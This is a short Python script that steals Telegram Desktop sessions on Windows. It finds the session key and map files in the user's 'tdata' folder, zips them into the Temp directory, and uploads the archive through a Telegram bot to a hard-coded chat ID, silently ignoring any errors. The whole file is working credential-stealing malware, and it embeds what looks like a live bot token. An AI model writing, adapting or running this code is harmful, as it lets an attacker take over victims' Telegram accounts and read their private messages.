from re import findall
from zipfile import ZipFile
import telebot
import os

pathusr = os.path.expanduser('~')
teleg = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata'
zipp = pathusr + '\\AppData\\Local\\Temp\\tdata.zip'

try:
	files1 = os.listdir(teleg)
	files1 = ' '.join(files1)
	files2 = os.listdir(teleg + '\D877F783D5D3EF8C')
	files2 = ' '.join(files2)
	file1 = findall(r'(D877F783D5D3EF8C\S)', files1)
	file2 = findall(r'(map\S)', files2)
	file1 = ''.join(file1)
	file2 = ''.join(file2)
	file1 = teleg + '\\' + file1
	file2 = teleg + '\\D877F783D5D3EF8C\\' + file2
	attch = []
	attch.append(file1)
	attch.append(file2)
	zippy = ZipFile(zipp, 'w')
	for file in attch:
		zippy.write(file)
	zippy.close()

except Exception as e:
	pass

bot = telebot.TeleBot('1224746653:AAGbwVGe7f8kO-Q8rg8yS0wfscVEoQmv0d0')
doc = open(pathusr + '\\AppData\\Local\\Temp\\tdata.zip','rb')
bot.send_document('560083718', doc)
doc.close()
exit()

